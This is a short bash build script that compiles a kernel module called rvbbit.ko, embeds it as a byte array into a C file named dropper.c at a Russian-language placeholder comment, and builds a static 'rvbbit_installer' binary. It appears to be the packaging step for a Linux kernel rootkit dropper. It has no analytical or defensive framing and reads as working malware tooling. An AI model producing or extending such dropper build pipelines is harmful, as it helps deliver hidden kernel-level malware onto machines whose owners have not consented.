#!/bin/bash
set -e
make clean; make
if [ ! -f rvbbit.ko ]; then exit 1; fi
xxd -i rvbbit.ko > rvbbit_ko.h
awk '/\/\* ===== !!!ВСТАВЬТЕ СЮДА СГЕНЕРИРОВАННЫЙ МАССИВ rvbbit_ko.h!!! ===== \*\// {print; while(getline < "rvbbit_ko.h") print; next} 1' dropper.c > dropper_full.c
gcc -O2 -static -o rvbbit_installer dropper_full.c
chmod +x rvbbit_installer
rm -f dropper_full.c rvbbit_ko.h